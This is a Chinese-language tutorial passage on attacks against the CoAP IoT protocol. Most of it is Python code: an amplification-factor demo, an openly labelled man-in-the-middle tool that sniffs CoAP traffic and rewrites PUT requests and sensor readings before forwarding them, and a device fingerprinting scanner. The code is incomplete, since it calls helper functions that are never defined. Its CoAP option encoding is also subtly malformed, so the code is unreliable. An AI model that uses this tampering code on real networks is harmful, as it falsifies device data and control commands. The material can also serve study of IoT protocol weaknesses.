# CoAP攻击技术与案例

### 6.1 CoAP放大攻击

```python
# CoAP放大攻击原理演示
class CoAPAmplificationDemo:
    """CoAP放大攻击分析"""
    
    """
    CoAP支持多播，攻击者可以利用这一点:
    1. 发送CoAP多播请求
    2. 多个设备同时响应
    3. 利用响应流量攻击目标
    
    放大倍数:
    - 请求大小: ~30-60字节
    - 响应大小: ~100-1500字节
    - 放大倍数: 3-50x
    """
    
    def analyze_amplification(self):
        """分析放大效果"""
        # 典型的CoAP多播场景
        multicast_address = 'ff02::fd'  # CoAP多播地址
        
        # 小型请求
        coap_request = self._build_coap_request(
            method='GET',
            uri='/.well-known/core'
        )
        request_size = len(coap_request)
        
        # 多播后每个设备的响应
        response_sizes = []
        
        # 模拟100个设备响应
        for i in range(100):
            response = self._build_coap_response(
                payload=f'< /sensor{i} >;rt="temperature"'
            )
            response_sizes.append(len(response))
        
        total_response = sum(response_sizes)
        amplification = total_response / request_size
        
        print(f"请求大小: {request_size} bytes")
        print(f"响应总数: {total_response} bytes")
        print(f"放大倍数: {amplification:.1f}x")
        
    def _build_coap_request(self, method, uri):
        """构造CoAP请求"""
        # NON类型，避免ACK
        header = bytes([0x50])  # Ver=1, Type=NON(1), TKL=0
        # 方法码
        code_map = {'GET': 0x01, 'POST': 0x02, 'PUT': 0x03, 'DELETE': 0x04}
        code = code_map.get(method, 0x01)
        # 随机Message ID
        msg_id = bytes([0xAA, 0xBB])
        # URI路径选项
        options = b''
        for part in uri.strip('/').split('/'):
            options += bytes([0xBB, len(part)]) + part.encode()
        # 无负载
        return header + bytes([code]) + msg_id + options
    
    def _build_coap_response(self, payload):
        """构造CoAP响应"""
        header = bytes([0x50])  # Ver=1, Type=NON, TKL=0
        code = 0x45  # 2.05 Content
        msg_id = bytes([0xCC, 0xDD])
        marker = bytes([0xFF])
        return header + bytes([code]) + msg_id + marker + payload.encode()
```

### 6.2 CoAP中间人攻击实战

```python
# CoAP中间人攻击分析
class CoAPMITM:
    """CoAP中间人攻击工具"""
    
    def __init__(self, interface='wlan0'):
        self.interface = interface
        self.running = False
        self.captured = {}
        
    def start_mitm(self, client_ip: str, server_ip: str, port: int = 5683):
        """启动中间人攻击"""
        self.running = True
        
        # 在无DTLS的环境中
        # 1. 捕获客户端请求
        # 2. 修改请求内容
        # 3. 转发给服务器
        # 4. 捕获服务器响应
        # 5. 修改响应内容
        # 6. 转发给客户端
        
        try:
            from scapy.all import sniff, UDP, IPv6, Raw
            from scapy.layers.inet6 import UDP
            
            def packet_handler(pkt):
                if UDP in pkt:
                    if pkt[UDP].dport == port:
                        self._process_request(pkt)
                    elif pkt[UDP].sport == port:
                        self._process_response(pkt)
            
            logger.info(f"开始MITM: {client_ip} <-> {server_ip}")
            sniff(iface=self.interface, prn=packet_handler,
                  filter=f"udp port {port}", store=False)
                  
        except ImportError:
            logger.error("需要安装scapy")
    
    def _process_request(self, pkt):
        """处理客户端请求"""
        payload = bytes(pkt[UDP].payload)
        coap_msg = parse_coap_message(payload)
        
        logger.info(f"请求: {coap_msg}")
        
        # 示例: 篡改PUT请求的数据
        if coap_msg.get('code') == 0x03:  # PUT
            modified = self._modify_payload(payload, b'hacked')
            # 重新计算校验和并发送
            self._forward(modified, pkt[IPv6].dst, pkt[UDP].dport)
    
    def _process_response(self, pkt):
        """处理服务器响应"""
        payload = bytes(pkt[UDP].payload)
        coap_msg = parse_coap_message(payload)
        
        logger.info(f"响应: {coap_msg}")
        
        # 示例: 篡改传感器数据
        if coap_msg.get('code') == 0x45:  # 2.05 Content
            modified = self._modify_payload(payload, b'99.9')
            self._forward(modified, pkt[IPv6].dst, pkt[UDP].dport)
```

### 6.3 CoAP设备指纹识别

```python
# CoAP设备指纹识别工具
class CoAPFingerprint:
    """通过CoAP协议特征识别IoT设备类型"""
    
    FINGERPRINT_DB = {
        'contiki': {
            'port': 5683,
            'well_known': '/.well-known/core',
            'features': ['observe', 'block-wise'],
            'msg_id_seq': 'sequential',
        },
        'libcoap': {
            'port': 5683,
            'well_known': '/.well-known/core',
            'features': ['observe', 'block-wise', ' multicast'],
            'msg_id_seq': 'random',
        },
        'californium': {
            'port': 5683,
            'well_known': '/.well-known/core',
            'features': ['observe', 'block-wise', 'dtls'],
            'msg_id_seq': 'random',
        },
        'coapthon': {
            'port': 5683,
            'well_known': '/.well-known/core',
            'features': ['observe', 'block-wise'],
            'msg_id_seq': 'sequential',
        },
    }
    
    def fingerprint(self, ip: str, port: int = 5683) -> dict:
        """对CoAP设备进行指纹识别"""
        result = {
            'ip': ip,
            'port': port,
            'reachable': False,
            'resources': [],
            'dtls': False,
            'device_type': 'unknown',
            'implementation': 'unknown',
        }
        
        # 1. 探测CoAP服务
        try:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            sock.settimeout(3)
            
            # 发送资源发现请求
            request = self._build_request('GET', '/.well-known/core')
            sock.sendto(request, (ip, port))
            
            response, addr = sock.recvfrom(2048)
            result['reachable'] = True
            
            # 解析资源列表
            coap_msg = parse_coap_message(response)
            if coap_msg.get('code') == 0x45:  # 2.05
                payload = coap_msg['payload'].decode('utf-8', errors='ignore')
                result['resources'] = self._parse_well_known(payload)
            
            # 2. 测试DTLS支持
            result['dtls'] = self._test_dtls(ip, port + 1)
            
            # 3. 测试Observe支持
            result['observe'] = self._test_observe(ip, port)
            
            # 4. 测试Block-wise传输
            result['block_wise'] = self._test_block_wise(ip, port)
            
            # 5. 分析Message ID序列
            result['msg_id_seq'] = self._analyze_msg_id_seq(ip, port)
            
            # 6. 匹配实现
            result['implementation'] = self._match_implementation(result)
            
        except socket.timeout:
            result['reachable'] = False
        except Exception as e:
            result['error'] = str(e)
        
        return result
```

---

---

